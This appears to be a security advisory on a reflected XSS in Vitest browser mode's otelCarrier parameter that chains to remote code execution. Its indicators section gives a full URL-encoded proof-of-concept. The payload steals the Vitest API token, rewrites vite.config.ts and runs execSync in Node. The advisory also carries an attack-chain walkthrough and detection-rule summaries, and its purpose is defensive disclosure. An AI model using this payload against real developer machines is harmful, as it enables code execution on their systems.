---
title: Vitest Browser Mode XSS via otelCarrier Parameter Leads to RCE
slug: 2026-06-vitest-xss
description: Vitest browser mode is vulnerable to reflected cross-site scripting (XSS) due to the `otelCarrier` query parameter being inserted directly into an inline module script without sanitization, enabling an attacker to craft a browser-runner URL that executes arbitrary JavaScript in the Vitest server origin, potentially leading to remote code execution (RCE).
date: "2026-06-01T14:14:49Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - xss
  - rce
  - vitest
  - javascript
  - dependency-vulnerability
vendors:
  - Vitest
products:
  - '@vitest/browser'
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059.004
    technique_name: 'Command and Scripting Interpreter: JavaScript'
references:
  - https://github.com/advisories/GHSA-2h32-95rg-cppp
  - https://github.com/vitest-dev/vitest/blob/cba2036a197ec8ed42c35a37db78ef07192202c7/packages/browser/src/node/serverOrchestrator.ts#L48
  - https://github.com/vitest-dev/vitest/blob/cba2036a197ec8ed42c35a37db78ef07192202c7/packages/browser/src/client/public/esm-client-injector.js#L41
  - https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq
iocs:
  - type: url
    value: http://localhost:63315/__vitest_test__/?otelCarrier=(alert(%22xss%20via%20otelCarrier%22)%2Cnull)
  - type: url
    value: http://localhost:63315/__vitest_test__/?otelCarrier=(setTimeout(async()%3D%3E%7B%0A%20%20const%20s%20%3D%20window.__vitest_browser_runner__%0A%20%20const%20%7B%20stringify%2C%20parse%20%7D%20%3D%20await%20import('https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fflatted%403.3.2%2F%2Besm')%0A%20%20const%20p%20%3D%20location.protocol%20%3D%3D%3D%20'https%3A'%20%3F%20'wss%3A'%20%3A%20'ws%3A'%0A%20%20const%20q%20%3D%20'type%3Dorchestrator%26rpcId%3Dpoc-'%20%2B%20Date.now()%0A%20%20%20%20%2B%20'%26sessionId%3D'%20%2B%20encodeURIComponent(s.sessionId)%0A%20%20%20%20%2B%20'%26projectName%3D'%20%2B%20encodeURIComponent(s.config.name%20%7C%7C%20'')%0A%20%20%20%20%2B%20'%26method%3D'%20%2B%20encodeURIComponent(s.method)%0A%20%20%20%20%2B%20'%26token%3D'%20%2B%20encodeURIComponent(window.VITEST_API_TOKEN%20%7C%7C%20'0')%0A%0A%20%20const%20ws%20%3D%20new%20WebSocket(p%20%2B%20'%2F%2F'%20%2B%20location.host%20%2B%20'%2F__vitest_browser_api__%3F'%20%2B%20q)%0A%20%20const%20pending%20%3D%20new%20Map()%0A%0A%20%20function%20call(m%2C%20a%20%3D%20%5B%5D)%20%7B%0A%20%20%20%20const%20i%20%3D%20crypto.randomUUID()%0A%20%20%20%20ws.send(stringify(%7B%20t%3A%20'q'%2C%20i%2C%20m%2C%20a%20%7D))%0A%20%20%20%20return%20new%20Promise((resolve%2C%20reject)%20%3D%3E%20%7B%0A%20%20%20%20%20%20pending.set(i%2C%20%7B%20resolve%2C%20reject%20%7D)%0A%20%20%20%20%7D)%0A%20%20%7D%0A%0A%20%20ws.onmessage%20%3D%20(event)%20%3D%3E%20%7B%0A%20%20%20%20const%20message%20%3D%20parse(event.data)%0A%20%20%20%20const%20promise%20%3D%20pending.get(message.i)%0A%20%20%20%20if%20(!promise)%20%7B%0A%20%20%20%20%20%20return%0A%20%20%20%20%7D%0A%20%20%20%20pending.delete(message.i)%0A%20%20%20%20if%20(message.e)%20%7B%0A%20%20%20%20%20%20promise.reject(message.e)%0A%20%20%20%20%7D%0A%20%20%20%20else%20%7B%0A%20%20%20%20%20%20promise.resolve(message.r)%0A%20%20%20%20%7D%0A%20%20%7D%0A%0A%20%20ws.onopen%20%3D%20async%20()%20%3D%3E%20%7B%0A%20%20%20%20const%20configPath%20%3D%20'vite.config.ts'%0A%20%20%20%20const%20original%20%3D%20await%20call('triggerCommand'%2C%20%5B%0A%20%20%20%20%20%20s.sessionId%2C%0A%20%20%20%20%20%20'readFile'%2C%0A%20%20%20%20%20%20configPath%2C%0A%20%20%20%20%20%20%5BconfigPath%2C%20'utf-8'%5D%2C%0A%20%20%20%20%5D)%0A%0A%20%20%20%20const%20injected%20%3D%20%60%0Aimport(%22node%3Achild_process%22).then(lib%20%3D%3E%20%7B%0A%20%20lib.execSync('touch%20.%2Frce-poc')%0A%20%20console.log('RCE%20success')%0A%7D)%0A%60%0A%20%20%20%20await%20call('triggerCommand'%2C%20%5B%0A%20%20%20%20%20%20s.sessionId%2C%0A%20%20%20%20%20%20'writeFile'%2C%0A%20%20%20%20%20%20configPath%2C%0A%20%20%20%20%20%20%5BconfigPath%2C%20injected%20%2B%20original%5D%2C%0A%20%20%20%20%5D)%0A%0A%20%20%20%20alert('POC%3A%20vite.config.ts%20modified%20to%20trigger%20RCE%20on%20config%20reload')%0A%20%20%7D%0A%0A%20%20ws.onerror%20%3D%20()%20%3D%3E%20alert('POC%3A%20browser%20api%20websocket%20failed')%0A%7D%2C0)%2Cnull)
ioc_counts:
  url: 2
rules:
  - title: Detect Vitest otelCarrier Parameter Injection
    description: Detects CVE-2026-47428 exploitation — Detects attempts to exploit the Vitest otelCarrier XSS vulnerability by looking for suspicious characters in the query parameter.
    platform: sigma
    severity: high
    tactics:
      - initial_access
    techniques:
      - T1190
    data_sources:
      - webserver
  - title: Detect Vitest Config File Modification via Browser API
    description: Detects attempts to modify the vite.config.ts file using the Vitest Browser API, potentially indicating RCE exploitation following CVE-2026-47428.
    platform: sigma
    severity: medium
    tactics:
      - execution
    techniques:
      - T1059.004
    data_sources:
      - webserver
rules_count: 2
---

The Vitest browser mode is susceptible to a reflected cross-site scripting (XSS) vulnerability. Specifically, the `otelCarrier` query parameter, when passed to the `/__vitest_test__/` endpoint, is directly inserted into an inline module script without proper sanitization. This allows an attacker to inject arbitrary JavaScript code that executes within the Vitest server's origin. The generated page also contains `VITEST_API_TOKEN`, which is used for authenticating Vitest WebSocket APIs, leading to potential token compromise and authenticated API calls. This issue affects Vitest versions >= 4.0.17 and < 4.1.6, as well as >= 5.0.0-beta.0 and < 5.0.0-beta.3, impacting users running Vitest browser mode. A successful exploit requires a victim to open a crafted Vitest browser-runner URL while the Vitest browser server is active.

## Attack Chain

1.  The attacker crafts a malicious URL targeting the `/__vitest_test__/` endpoint, embedding JavaScript code within the `otelCarrier` query parameter.
2.  The victim opens the attacker-crafted URL in a web browser while the Vitest browser server is running.
3.  The Vitest server reflects the unsanitized `otelCarrier` parameter directly into an inline module script within the generated HTML page.
4.  The injected JavaScript executes within the victim's browser, in the Vitest server origin.
5.  The attacker's script accesses `window.VITEST_API_TOKEN`, compromising the Vitest WebSocket API token.
6.  The attacker uses the compromised API token to authenticate with the Vitest WebSocket API endpoint at `/__vitest_browser_api__`.
7.  The attacker calls the `triggerCommand` function via the WebSocket to write a malicious payload into the `vite.config.ts` file.
8.  Vitest/Vite reloads the modified configuration file, resulting in the execution of the injected code within the Node.js environment, achieving remote code execution (RCE).

## Impact

Successful exploitation allows an attacker to execute arbitrary JavaScript code within the Vitest server's origin. In a default local browser-mode setup, this XSS can be leveraged to compromise the Vitest API token, leading to server-side code execution. A confirmed proof of concept demonstrates modifying `vite.config.ts` to execute arbitrary code in Node. This issue poses a significant risk to developers and CI/CD environments using Vitest in browser mode.

## Recommendation

*   Apply the patch or upgrade to a non-vulnerable version of `@vitest/browser` to address CVE-2026-47428.
*   Deploy the Sigma rule "Detect Vitest otelCarrier Parameter Injection" to identify potential exploitation attempts by detecting suspicious characters in the `otelCarrier` query parameter within web server logs.
*   Block access to the known malicious URLs (e.g., `http://localhost:63315/__vitest_test__/?otelCarrier=(alert(%22xss%20via%20otelCarrier%22)%2Cnull)`) listed in the IOC section at the network perimeter.
